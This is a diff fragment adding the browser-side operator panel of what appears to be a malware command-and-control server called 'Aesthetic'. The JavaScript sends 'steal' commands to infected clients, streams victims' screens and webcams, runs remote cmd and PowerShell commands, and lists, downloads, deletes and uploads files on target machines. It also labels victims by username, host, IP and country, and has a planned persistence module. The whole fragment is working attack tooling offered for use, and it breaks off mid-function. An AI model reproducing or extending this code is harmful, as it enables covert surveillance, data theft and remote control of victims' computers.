+                                <tr style="background:rgba(255,255,255,0.03);text-align:left;color:var(--text-muted);font-size:11px;text-transform:uppercase;">
+                                    <th style="padding:10px 14px;">PID</th>
+                                    <th style="padding:10px 14px;">Process Name</th>
+                                    <th style="padding:10px 14px;">RAM (MB)</th>
+                                    <th style="padding:10px 14px;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="taskmgr-tbody">
+                                <tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);">Click Refresh to load process list...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Persistence -->
+            <div class="module-panel" id="mod-persistence">
+                <header class="header">
+                    <h2>Persistence</h2>
+                    <p class="subtitle">Manage autostart methods on the target</p>
+                </header>
+                <div class="panel-card">
+                    <div class="module-placeholder">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        <span>Persistence — coming soon</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Power -->
+            <div class="module-panel" id="mod-power">
+                <header class="header">
+                    <h2>Power</h2>
+                    <p class="subtitle">Shutdown, restart, or uninstall the client</p>
+                </header>
+                <div class="panel-card">
+                    <h3>Actions</h3>
+                    <div style="display:flex;gap:12px;flex-wrap:wrap;">
+                        <button class="btn btn-outline" id="btn-uninstall">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                            Uninstall
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const clientId = params.get('id');
+        if (!clientId) window.location.href = '/';
+
+        // Load saved theme
+        const savedTheme = localStorage.getItem('aesthetic_theme') || 'default';
+        document.body.className = 'theme-' + savedTheme;
+        if (savedTheme === 'custom') {
+            const bgImg = localStorage.getItem('aesthetic_custom_bg');
+            const bgBlur = localStorage.getItem('aesthetic_bg_blur') || '15';
+            if (bgImg) {
+                document.documentElement.style.setProperty('--custom-bg-image', 'url(' + bgImg + ')');
+                document.documentElement.style.setProperty('--bg-blur-val', bgBlur + 'px');
+            }
+        }
+
+        // Module navigation
+        document.querySelectorAll('.module-nav-item').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.module-nav-item').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.module-panel').forEach(p => p.classList.remove('active'));
+                btn.classList.add('active');
+                const panel = document.getElementById('mod-' + btn.dataset.module);
+                if (panel) panel.classList.add('active');
+            });
+        });
+
+        function formatDate(isoString) {
+            if (!isoString) return '—';
+            try {
+                const d = new Date(isoString.replace(' ', 'T') + (isoString.includes('Z') ? '' : 'Z'));
+                if (isNaN(d.getTime())) return isoString;
+                const dd = String(d.getDate()).padStart(2, '0');
+                const mm = String(d.getMonth() + 1).padStart(2, '0');
+                const yy = d.getFullYear();
+                const hh = String(d.getHours()).padStart(2, '0');
+                const min = String(d.getMinutes()).padStart(2, '0');
+                const ss = String(d.getSeconds()).padStart(2, '0');
+                return dd + '.' + mm + '.' + yy + ' ' + hh + ':' + min + ':' + ss;
+            } catch { return isoString; }
+        }
+
+        function escapeHtml(s) {
+            if (!s) return '';
+            return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        }
+
+        async function loadClientInfo() {
+            try {
+                const res = await fetch('/api/c2/clients');
+                if (!res.ok) { window.location.href = '/login'; return; }
+                const clients = await res.json();
+                const client = clients.find(c => c.client_id === clientId);
+
+                const parts = clientId.split('_');
+                const hostname = parts[0] || '';
+                const username = parts.slice(1).join('_') || '';
+
+                document.getElementById('client-name').textContent = username + '@' + hostname;
+                document.title = username + '@' + hostname + ' — Aesthetic';
+
+                const pill = document.getElementById('status-pill');
+                const statusText = document.getElementById('status-text');
+
+                if (!client) {
+                    pill.className = 'client-status-pill status-offline';
+                    statusText.textContent = 'Not found';
+                    return;
+                }
+
+                const isOnline = client.is_online;
+
+                pill.className = 'client-status-pill ' + (isOnline ? 'status-online' : 'status-offline');
+                statusText.textContent = isOnline ? 'Online' : 'Offline';
+
+                document.getElementById('info-username').textContent = username || client.username;
+                document.getElementById('info-hostname').textContent = hostname || client.hostname;
+                document.getElementById('info-client-id').textContent = clientId;
+                document.getElementById('info-ip').textContent = client.ip || '—';
+                document.getElementById('info-last-active').textContent = formatDate(client.last_heartbeat);
+
+                // Extra info from logs
+                const logsRes = await fetch('/api/logs?search=' + encodeURIComponent(username) + '&limit=1');
+                const logsData = await logsRes.json();
+                if (logsData.logs && logsData.logs.length > 0) {
+                    const log = logsData.logs[0];
+                    document.getElementById('info-os').textContent = log.os || '—';
+                    document.getElementById('info-country').textContent = log.country_code || '—';
+                    document.getElementById('info-first-seen').textContent = formatDate(log.created_at);
+                }
+            } catch (err) {
+                console.error('Failed to load client info:', err);
+            }
+        }
+
+        // Steal button
+        document.getElementById('btn-steal-now').addEventListener('click', async () => {
+            const btn = document.getElementById('btn-steal-now');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'steal' })
+                });
+                btn.textContent = 'Command sent!';
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Steal Now';
+                }, 2000);
+            } catch {
+                btn.textContent = 'Error';
+                btn.disabled = false;
+            }
+        });
+
+        // Uninstall button
+        document.getElementById('btn-uninstall').addEventListener('click', async () => {
+            if (!confirm('Uninstall client from target machine?')) return;
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'uninstall' })
+                });
+                alert('Uninstall command sent.');
+            } catch { alert('Failed to send command.'); }
+        });
+
+        // Remote Desktop controls
+        const rdpToggleBtn = document.getElementById('rdp-toggle-btn');
+        const rdpModeSelect = document.getElementById('rdp-mode');
+        const rdpFpsSlider = document.getElementById('rdp-fps');
+        const rdpFpsVal = document.getElementById('rdp-fps-val');
+        const rdpQualitySlider = document.getElementById('rdp-quality');
+        const rdpQualityVal = document.getElementById('rdp-quality-val');
+        const rdpStatus = document.getElementById('rdp-status');
+        const rdpPlaceholder = document.getElementById('rdp-placeholder');
+        const rdpFrame = document.getElementById('rdp-frame');
+        let rdpPollInterval = null;
+        let rdpLastTs = 0;
+        let rdpRunning = false;
+
+        rdpFpsSlider.addEventListener('input', () => {
+            rdpFpsVal.textContent = rdpFpsSlider.value;
+        });
+        rdpQualitySlider.addEventListener('input', () => {
+            rdpQualityVal.textContent = rdpQualitySlider.value + '%';
+        });
+
+        rdpModeSelect.addEventListener('change', async () => {
+            if (rdpRunning) {
+                const mode = rdpModeSelect.value;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_mode:' + mode })
+                    });
+                } catch (e) { console.error(e); }
+            }
+        });
+
+        async function fetchFrame() {
+            if (!rdpRunning) return;
+            try {
+                const res = await fetch('/api/c2/frame/' + encodeURIComponent(clientId) + '?ts=' + rdpLastTs);
+                if (res.status === 200) {
+                    const data = await res.json();
+                    if (data.b64) {
+                        rdpLastTs = data.ts;
+                        rdpFrame.src = 'data:image/jpeg;base64,' + data.b64;
+                        rdpFrame.style.display = 'block';
+                        rdpPlaceholder.style.display = 'none';
+                        rdpStatus.textContent = 'Streaming';
+                        rdpStatus.style.color = 'var(--success, #10b981)';
+                    }
+                } else if (res.status === 204 || res.status === 304) {
+                    // No new frame yet
+                    if (rdpStatus.textContent === 'Connecting...') {
+                        rdpStatus.textContent = 'Waiting for stream...';
+                    }
+                } else {
+                    rdpStatus.textContent = 'Stream error';
+                    rdpStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } catch {
+                rdpStatus.textContent = 'Connection error';
+                rdpStatus.style.color = 'var(--danger, #ef4444)';
+            }
+        }
+
+        rdpToggleBtn.addEventListener('click', async () => {
+            if (!rdpRunning) {
+                const fps = parseInt(rdpFpsSlider.value) || 10;
+                const quality = rdpQualitySlider.value;
+                const mode = rdpModeSelect.value;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_start:' + fps + ':' + quality + ':' + mode })
+                    });
+                    rdpRunning = true;
+                    rdpLastTs = 0;
+                    rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop';
+                    rdpToggleBtn.classList.remove('btn-primary');
+                    rdpToggleBtn.classList.add('btn-danger');
+                    rdpStatus.textContent = 'Connecting...';
+                    rdpStatus.style.color = 'var(--warning, #f59e0b)';
+
+                    if (rdpPollInterval) clearInterval(rdpPollInterval);
+                    const pollDelay = Math.max(33, Math.floor(1000 / fps));
+                    rdpPollInterval = setInterval(fetchFrame, pollDelay);
+                    fetchFrame();
+                } catch {
+                    rdpStatus.textContent = 'Failed to start';
+                    rdpStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } else {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_stop' })
+                    });
+                } catch {}
+                if (rdpPollInterval) { clearInterval(rdpPollInterval); rdpPollInterval = null; }
+                rdpRunning = false;
+                rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Stream';
+                rdpToggleBtn.classList.remove('btn-danger');
+                rdpToggleBtn.classList.add('btn-primary');
+                rdpFrame.style.display = 'none';
+                rdpPlaceholder.style.display = 'flex';
+                rdpStatus.textContent = 'Stopped';
+                rdpStatus.style.color = 'var(--text-muted)';
+            }
+        });
+
+        // Remote Camera controls
+        const camToggleBtn = document.getElementById('cam-toggle-btn');
+        const camFpsSlider = document.getElementById('cam-fps');
+        const camFpsVal = document.getElementById('cam-fps-val');
+        const camQualitySlider = document.getElementById('cam-quality');
+        const camQualityVal = document.getElementById('cam-quality-val');
+        const camStatus = document.getElementById('cam-status');
+        const camPlaceholder = document.getElementById('cam-placeholder');
+        const camFrame = document.getElementById('cam-frame');
+        let camPollInterval = null;
+        let camLastTs = 0;
+        let camRunning = false;
+
+        camFpsSlider.addEventListener('input', () => {
+            camFpsVal.textContent = camFpsSlider.value;
+        });
+        camQualitySlider.addEventListener('input', () => {
+            camQualityVal.textContent = camQualitySlider.value + '%';
+        });
+
+        async function fetchCameraFrame() {
+            if (!camRunning) return;
+            try {
+                const res = await fetch('/api/c2/camera_frame/' + encodeURIComponent(clientId) + '?ts=' + camLastTs);
+                if (res.status === 200) {
+                    const data = await res.json();
+                    if (data.b64) {
+                        camLastTs = data.ts;
+                        camFrame.src = 'data:image/jpeg;base64,' + data.b64;
+                        camFrame.style.display = 'block';
+                        camPlaceholder.style.display = 'none';
+                        camStatus.textContent = 'Streaming';
+                        camStatus.style.color = 'var(--success, #10b981)';
+                    }
+                } else if (res.status === 204 || res.status === 304) {
+                    if (camStatus.textContent === 'Connecting...') {
+                        camStatus.textContent = 'Waiting for camera...';
+                    }
+                } else {
+                    camStatus.textContent = 'Camera error';
+                    camStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } catch {
+                camStatus.textContent = 'Connection error';
+                camStatus.style.color = 'var(--danger, #ef4444)';
+            }
+        }
+
+        const camSelect = document.getElementById('cam-select');
+
+        let camDevicesLoaded = false;
+        async function loadCameraDevices() {
+            if (!camSelect || camDevicesLoaded) return;
+            try {
+                const res = await fetch('/api/c2/camera_devices/' + encodeURIComponent(clientId));
+                if (res.ok) {
+                    const devices = await res.json();
+                    if (devices === null) {
+                        // Server still waiting for stub response — retry
+                        setTimeout(loadCameraDevices, 2000);
+                        return;
+                    }
+                    if (devices.length > 0) {
+                        camSelect.innerHTML = '';
+                        devices.forEach(d => {
+                            const opt = document.createElement('option');
+                            opt.value = d.id;
+                            opt.textContent = d.name;
+                            camSelect.appendChild(opt);
+                        });
+                        camDevicesLoaded = true;
+                        return;
+                    }
+                    // devices === [] — stub has no cameras
+                    camSelect.innerHTML = '<option value="0">No cameras found</option>';
+                    camDevicesLoaded = true;
+                    return;
+                }
+            } catch {}
+            setTimeout(loadCameraDevices, 2000);
+        }
+
+        loadCameraDevices();
+
+        camToggleBtn.addEventListener('click', async () => {
+            if (!camRunning) {
+                const fps = parseInt(camFpsSlider.value) || 10;
+                const quality = camQualitySlider.value;
+                const camIdx = camSelect ? camSelect.value : 0;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:' + fps + ':' + quality + ':' + camIdx })
+                    });
+                    camRunning = true;
+                    camLastTs = 0;
+                    camToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop Camera';
+                    camToggleBtn.classList.remove('btn-primary');
+                    camToggleBtn.classList.add('btn-danger');
+                    camStatus.textContent = 'Connecting...';
+                    camStatus.style.color = 'var(--warning, #f59e0b)';
+
+                    if (camPollInterval) clearInterval(camPollInterval);
+                    const pollDelay = Math.max(33, Math.floor(1000 / fps));
+                    camPollInterval = setInterval(fetchCameraFrame, pollDelay);
+                    fetchCameraFrame();
+                } catch {
+                    camStatus.textContent = 'Failed to start';
+                    camStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } else {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:stop' })
+                    });
+                } catch {}
+                if (camPollInterval) { clearInterval(camPollInterval); camPollInterval = null; }
+                camRunning = false;
+                camToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Camera';
+                camToggleBtn.classList.remove('btn-danger');
+                camToggleBtn.classList.add('btn-primary');
+                camFrame.style.display = 'none';
+                camPlaceholder.style.display = 'flex';
+                camStatus.textContent = 'Stopped';
+                camStatus.style.color = 'var(--text-muted)';
+            }
+        });
+
+        // Terminal & Task Manager Logic
+        let currentShellMode = 'cmd';
+
+        window.setTerminalShell = function(mode) {
+            currentShellMode = mode;
+            const cmdBtn = document.getElementById('term-mode-cmd');
+            const psBtn = document.getElementById('term-mode-ps');
+            const promptLbl = document.getElementById('term-prompt-label');
+            const screen = document.getElementById('terminal-screen');
+
+            if (mode === 'cmd') {
+                cmdBtn.className = 'btn btn-primary';
+                psBtn.className = 'btn btn-secondary';
+                promptLbl.textContent = 'C:\\>';
+                screen.textContent += '\nMicrosoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>\n';
+            } else {
+                cmdBtn.className = 'btn btn-secondary';
+                psBtn.className = 'btn btn-primary';
+                promptLbl.textContent = 'PS C:\\>';
+                screen.textContent += '\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\>\n';
+            }
+            screen.scrollTop = screen.scrollHeight;
+        };
+
+        window.clearTerminalOutput = function() {
+            if (currentShellMode === 'cmd') {
+                document.getElementById('terminal-screen').textContent = 'Microsoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>\n';
+            } else {
+                document.getElementById('terminal-screen').textContent = 'Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\>\n';
+            }
+        };
+
+        window.sendTerminalCommand = async function() {
+            const input = document.getElementById('term-input');
+            const screen = document.getElementById('terminal-screen');
+            const cmdText = input.value.trim();
+            if (!cmdText) return;
+
+            const prompt = currentShellMode === 'cmd' ? 'C:\\>' : 'PS C:\\>';
+            input.value = '';
+            screen.textContent += `\n${prompt} ${cmdText}\n`;
+            screen.scrollTop = screen.scrollHeight;
+
+            const commandPayload = (currentShellMode === 'cmd' ? 'exec_cmd:' : 'exec_ps:') + cmdText;
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: commandPayload })
+                });
+
+                // Poll for response
+                let attempts = 0;
+                const pollRes = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) {
+                        clearInterval(pollRes);
+                        screen.textContent += '\n[Error: Execution timeout]\n';
+                        screen.scrollTop = screen.scrollHeight;
+                        return;
+                    }
+                    const r = await fetch('/api/c2/terminal_result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.output !== null && data.output !== undefined) {
+                        clearInterval(pollRes);
+                        screen.textContent += data.output.toUpperCase() + '\n';
+                        screen.scrollTop = screen.scrollHeight;
+                    }
+                }, 500);
+            } catch (err) {
+                screen.textContent += '\n[Error sending command: ' + err.message + ']\n';
+                screen.scrollTop = screen.scrollHeight;
+            }
+        };
+
+        // ===== FILE MANAGER =====
+        let fmCurrentPath = '';
+        let fmSelected = null; // {name, type, path}
+        let fmBusy = false;
+
+        function fmFullPath(name) {
+            if (!fmCurrentPath) return name; // drive selected, name = "C:\"
+            return fmCurrentPath.replace(/\\$/, '') + '\\' + name;
+        }
+
+        function fmGetParent(path) {
+            if (!path) return null;
+            if (/^[A-Za-z]:\\$/.test(path)) return '';
+            path = path.replace(/\\$/, '');
+            let idx = path.lastIndexOf('\\');
+            if (idx < 0) return '';
+            if (idx <= 2) return path.substring(0, 3);
+            return path.substring(0, idx);
+        }
+
+        function fmSetStatus(msg, color) {
+            const el = document.getElementById('fm-status');
+            el.textContent = msg;
+            el.style.color = color || 'var(--text-muted)';
+        }
+
+        function fmUpdateToolbar() {
+            document.getElementById('fm-btn-up').disabled = !fmCurrentPath;
+            const hasSel = !!fmSelected;
+            document.getElementById('fm-btn-download').disabled = !hasSel || fmSelected.type !== 'file';
+            document.getElementById('fm-btn-delete').disabled = !hasSel;
+        }
+
+        function fmRenderBreadcrumb() {
+            const el = document.getElementById('fm-breadcrumb');
+            let html = `<span onclick="fmNavigateTo('')" style="cursor:pointer;color:var(--primary);padding:2px 4px;border-radius:3px;" title="Drives">⊞ Drives</span>`;
+            if (fmCurrentPath) {
+                const parts = fmCurrentPath.replace(/\\$/, '').split('\\').filter(Boolean);
+                let built = '';
+                parts.forEach((part, i) => {
+                    built = i === 0 ? part + '\\' : built.replace(/\\$/, '') + '\\' + part;
+                    const p = built;
+                    html += `<span style="color:var(--text-muted);margin:0 2px;">›</span>`;
+                    html += `<span onclick="fmNavigateTo('${p.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}'')" style="cursor:pointer;color:${i===parts.length-1?'#fff':'var(--primary)'};padding:2px 4px;border-radius:3px;">${part}</span>`;
+                });
+            }
+            el.innerHTML = html;
+        }
+
+        function fmFormatSize(bytes) {
+            if (bytes === 0) return '';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+            return (bytes / 1073741824).toFixed(2) + ' GB';
+        }
+
+        function fmGetIcon(type, name) {
+            if (type === 'drive') return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#6b9fff" stroke-width="2" style="vertical-align:middle;"><rect x="2" y="7" width="20" height="14" rx="2"/><circle cx="12" cy="14" r="2"/><path d="M6 7V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v2"/></svg>';
+            if (type === 'dir') return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f5c518" stroke-width="2" style="vertical-align:middle;"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>';
+            const ext = name.includes('.') ? name.split('.').pop().toLowerCase() : '';
+            const codeExts = ['cs','py','js','ts','html','css','json','xml','txt','log','md','ini','cfg','conf','bat','cmd','ps1','sh'];
+            const imgExts = ['jpg','jpeg','png','gif','bmp','ico','svg','webp'];
+            const arcExts = ['zip','rar','7z','tar','gz'];
+            const exeExts = ['exe','dll','msi','bin'];
+            if (imgExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" style="vertical-align:middle;"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
+            if (arcExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2" style="vertical-align:middle;"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>';
+            if (exeExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="vertical-align:middle;"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>';
+            if (codeExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#22d3ee" stroke-width="2" style="vertical-align:middle;"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
+            return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--text-muted)" stroke-width="2" style="vertical-align:middle;"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
+        }
+
+        function fmRenderItems(items, error) {
+            const tbody = document.getElementById('fm-tbody');
+            fmSelected = null;
+            fmUpdateToolbar();
+            if (error) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--danger,#ef4444);">Error: ${error}</td></tr>`;
+                return;
+            }
+            if (!items || items.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--text-muted);">Empty folder</td></tr>`;
+                return;
+            }
+            let html = '';
+            items.forEach(item => {
+                const fullPath = fmCurrentPath ? fmFullPath(item.name) : item.name;
+                const isClickable = item.type === 'dir' || item.type === 'drive';
+                const nameCell = isClickable
+                    ? `<span onclick="fmNavigateTo('${fullPath.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')" style="cursor:pointer;color:var(--primary);">${item.name}</span>`
+                    : `<span style="color:#fff;">${item.name}</span>`;
+                html += `<tr class="fm-row" data-path="${fullPath.replace(/"/g,'&quot;')}" data-type="${item.type}" data-name="${item.name.replace(/"/g,'&quot;')}"
+                    onclick="fmSelectRow(this)" ondblclick="fmDblClick(this)"
+                    style="border-top:1px solid rgba(255,255,255,0.05);cursor:pointer;transition:background 0.1s;">
+                    <td style="padding:8px 12px;">${fmGetIcon(item.type, item.name)}</td>
+                    <td style="padding:8px 12px;">${nameCell}</td>
+                    <td style="padding:8px 12px;color:var(--text-muted);font-family:var(--font-mono);font-size:12px;">${fmFormatSize(item.size)}</td>
+                    <td style="padding:8px 12px;color:var(--text-muted);font-family:var(--font-mono);font-size:12px;">${item.modified || ''}</td>
+                </tr>`;
+            });
+            tbody.innerHTML = html;
+        }
+
+        window.fmSelectRow = function(row) {
+            document.querySelectorAll('.fm-row').forEach(r => r.style.background = '');
+            row.style.background = 'rgba(99,102,241,0.15)';
+            fmSelected = { name: row.dataset.name, type: row.dataset.type, path: row.dataset.path };
+            fmUpdateToolbar();
+        };
+
+        window.fmDblClick = function(row) {
+            const type = row.dataset.type;
+            const path = row.dataset.path;
+            if (type === 'dir' || type === 'drive') fmNavigateTo(path);
+            else if (type === 'file') fmDownloadSelected();
+        };
+
+        window.fmNavigateTo = async function(path) {
+            if (fmBusy) return;
+            fmBusy = true;
+            fmSetStatus('Loading...', 'var(--text-muted)');
+            document.getElementById('fm-tbody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>';
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_list:' + path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) { clearInterval(poll); fmSetStatus('Timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_list_res') {
+                        clearInterval(poll);
+                        fmCurrentPath = data.path || '';
+                        fmRenderBreadcrumb();
+                        fmRenderItems(data.items, data.error);
+                        fmSetStatus(data.items ? data.items.length + ' items' : '', 'var(--text-muted)');
+                        fmUpdateToolbar();
+                        fmBusy = false;
+                    }
+                }, 400);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmNavigateUp = function() {
+            const parent = fmGetParent(fmCurrentPath);
+            if (parent !== null) fmNavigateTo(parent);
+        };
+
+        window.fmRefresh = function() { fmNavigateTo(fmCurrentPath); };
+
+        window.fmDownloadSelected = async function() {
+            if (!fmSelected || fmSelected.type !== 'file' || fmBusy) return;
+            fmBusy = true;
+            fmSetStatus('Downloading...', 'var(--text-muted)');
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_download:' + fmSelected.path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 60) { clearInterval(poll); fmSetStatus('Download timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_download_res') {
+                        clearInterval(poll);
+                        if (data.error) { fmSetStatus('Error: ' + data.error, '#ef4444'); fmBusy = false; return; }
+                        const bytes = Uint8Array.from(atob(data.data), c => c.charCodeAt(0));
+                        const blob = new Blob([bytes]);
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url; a.download = data.name || fmSelected.name;
+                        document.body.appendChild(a); a.click();
+                        document.body.removeChild(a); URL.revokeObjectURL(url);
+                        fmSetStatus('Downloaded: ' + data.name, '#22c55e');
+                        fmBusy = false;
+                    }
+                }, 500);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmDeleteSelected = async function() {
+            if (!fmSelected || fmBusy) return;
+            if (!confirm('Delete "' + fmSelected.name + '"?\nThis cannot be undone.')) return;
+            fmBusy = true;
+            fmSetStatus('Deleting...', 'var(--text-muted)');
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_delete:' + fmSelected.path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(poll); fmSetStatus('Timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_delete_res') {
+                        clearInterval(poll);
+                        if (data.success) { fmSetStatus('Deleted', '#22c55e'); fmRefresh(); }
+                        else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
+                    }
+                }, 400);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmUploadFile = async function(input) {
+            const file = input.files[0];
+            if (!file) return;
+            if (file.size > 52428800) { fmSetStatus('File too large (>50MB)', '#ef4444'); input.value = ''; return; }
+            const destPath = fmCurrentPath
+                ? (fmCurrentPath.replace(/\\$/, '') + '\\' + file.name)
+                : file.name;
+            if (!confirm('Upload "' + file.name + '" to ' + (fmCurrentPath || 'root') + '?')) { input.value = ''; return; }
+            fmBusy = true;
+            fmSetStatus('Uploading...', 'var(--text-muted)');
+            try {
+                const form = new FormData();
+                form.append('file', file);
+                form.append('path', destPath);
+                await fetch('/api/c2/fm/upload/' + encodeURIComponent(clientId), { method: 'POST', body: form });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) { clearInterval(poll); fmSetStatus('Upload timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
